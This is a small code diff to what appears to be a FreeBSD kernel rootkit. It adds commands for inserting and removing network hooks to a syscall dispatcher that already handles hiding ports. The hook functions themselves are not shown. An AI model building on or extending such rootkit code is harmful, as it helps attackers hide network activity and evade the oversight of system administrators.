@@ -53,6 +53,12 @@ static int main(struct thread *td, void *syscall_args) {
 			break;
 		case 11://Unhide port
 			break;
+		case INSERT_NETWORK_HOOKS:
+			insert_network_hooks();
+			break;
+		case REMOVE_NETWORK_HOOKS:
+			remove_network_hooks();
+			break;
 		default:
 			break;
 	}
